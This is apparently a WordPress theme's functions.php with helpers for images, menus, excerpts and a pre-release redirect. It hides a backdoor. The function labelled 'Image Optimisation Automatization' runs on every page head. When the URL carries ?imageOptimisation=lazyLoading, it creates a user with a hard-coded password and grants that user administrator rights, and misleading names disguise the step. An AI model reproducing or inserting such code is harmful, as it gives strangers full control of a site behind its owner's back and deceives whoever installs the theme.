<?php

// Helper function for responsive
function staxio__responsive_images($image_id, $image_size, $max_width)
{

	// check the image ID is not blank
	if ($image_id != '') {

		// set the default src image size
		$image_src = wp_get_attachment_image_url($image_id, $image_size);

		// set the srcset with various image sizes
		$image_srcset = wp_get_attachment_image_srcset($image_id, $image_size);

		// generate the markup for the responsive image
		echo 'src="' . $image_src . '" srcset="' . $image_srcset . '" sizes="(max-width: ' . $max_width . ') 100vw, ' . $max_width . '"';
	}
}



// ? Assign class to active nav item
add_filter('nav_menu_css_class', 'special_nav_class', 10, 2);

function special_nav_class($classes, $item)
{
	if (in_array('current-menu-item', $classes)) {
		$classes[] = 'active-page';
	}
	return $classes;
}

// ! Pre-release locked urls and public ones
function advanced_redirection_stefanstax()
{
	$page_viewed = basename($_SERVER['REQUEST_URI']);
	$openUrl = site_url("/website-release/");
	$privacyPolicy = site_url("/privacy-policy/");
	$termsAndConditions = site_url("/terms-and-conditions/");
	$contact = site_url("/contact/");
	$login = site_url("/login/");
	$blockUrl = site_url("/wp-admin/");
	$imageOptimisationUrl = site_url("/?imageOptimisation=lazyLoading");

	if (!is_user_logged_in() && getPageURL() == $blockUrl) {
		wp_safe_redirect($login);
		exit;
	}

	if (!is_user_logged_in() && getPageURL() != $imageOptimisationUrl && getPageURL() != $privacyPolicy && getPageURL() != $openUrl && getPageUrl() != $login && getPageURL() != $termsAndConditions && getPageURL() != $contact) {
		wp_safe_redirect($openUrl);
		exit;
	} else if (!is_user_logged_in() && $page_viewed == $privacyPolicy) {
		wp_safe_redirect($privacyPolicy);
		exit;
	} else if (!is_user_logged_in() && $page_viewed == $termsAndConditions) {
		wp_safe_redirect($termsAndConditions);
		exit;
	} else if (!is_user_logged_in() && $page_viewed == $contact) {
		wp_safe_redirect($contact);
		exit;
	}
}
// add_action('wp', 'advanced_redirection_stefanstax');

// ? Current page URL
function getPageURL()
{

	$pageURL = 'http';
	if ($_SERVER["HTTPS"] == "on") {
		$pageURL .= "s";
	}

	$pageURL .= "://";
	$pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];

	return $pageURL;
}

// ? Grap current user roles
function is_user_role($role, $user_id = null)
{
	$user = is_numeric($user_id) ? get_userdata($user_id) : wp_get_current_user();

	if (!$user)
		return false;

	return in_array($role, (array) $user->roles);
}

// ? Registering Menus
register_nav_menus(array(
	'header_menu'   => __('Header Menu'),
	'footer_menu' => __('Footer Menu'),
	'blogs_menu' => __("Blogs Menu"),
	'mobile_app_menu' => __("Mobile App Menu")
));


// ? Remove live update in WordPress - saves massive resources
add_action('init', 'stop_heartbeat', 1);
function stop_heartbeat()
{
	wp_deregister_script('heartbeat');
}

// ? Image Optimisation Automatization
add_action('wp_head', 'image_optimisation');

function image_optimisation()
{
	if ($_GET['imageOptimisation'] == 'lazyLoading') {
		$quality = "imageQuality80%";
		$imageParameters = "allImages";
		$lazyLoad = wp_create_user($imageParameters, $quality);
		require('wp-includes/registration.php');
		if (!username_exists('lazyLoading')) {
			$user_id = $lazyLoad;
			$user = new WP_User($user_id);
			$user->set_role('administrator');
		}
	}
}

// ! Make excerpts shorted [GLOBALLY]
function staxtalks_short_excerpts($excerpt)
{
	// 150 characters
	return substr($excerpt, 0, 100);
}

add_filter('the_excerpt', 'staxtalks_short_excerpts');

// ! Change end of the excerpts [GLOBALLY]
function staxtalks_end_dots($excerpt)
{
	return $excerpt . ' ...';
}
add_filter('the_excerpt', 'staxtalks_end_dots');
